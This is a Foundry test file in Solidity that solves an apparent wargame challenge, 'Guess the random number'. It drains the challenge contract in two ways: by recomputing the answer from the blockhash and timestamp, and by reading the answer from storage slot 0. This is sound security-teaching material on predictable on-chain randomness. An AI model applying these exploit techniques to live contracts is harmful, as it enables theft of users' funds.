// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./GuessTheRandomNumberChallenge.sol";

contract GuessTheRandomNumberChallengeTest is Test {
    GuessTheRandomNumberChallenge public guessTheRandomNumberChallenge;
    uint256 deployBlockNumber;
    uint256 deployTime;

    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        guessTheRandomNumberChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
        deployBlockNumber = block.number;
        deployTime = block.timestamp;
    }

    function testGuessTheRandomNumber1() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("guessTheRandomNumberChallenge's balance", address(guessTheRandomNumberChallenge).balance);

        // Suppose several blocks have passed
        vm.roll(deployBlockNumber + 10);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(deployBlockNumber - 1), deployTime))));
        emit log_named_uint("answer", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(answer);
        vm.stopPrank();

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint(
            "guessTheRandomNumberChallenge's new balance", address(guessTheRandomNumberChallenge).balance
        );

        assertTrue(guessTheRandomNumberChallenge.isComplete());
    }

    function testGuessTheRandomNumber2() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("guessTheRandomNumberChallenge's balance", address(guessTheRandomNumberChallenge).balance);

        uint256 answer = uint256(vm.load(address(guessTheRandomNumberChallenge), bytes32(uint256(0))));

        emit log_named_uint("answer", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(uint8(answer));
        vm.stopPrank();

        emit log_named_uint("my new value", hacker.balance);
        emit log_named_uint(
            "guessTheRandomNumberChallenge's new balance", address(guessTheRandomNumberChallenge).balance
        );

        assertTrue(guessTheRandomNumberChallenge.isComplete());
    }
}
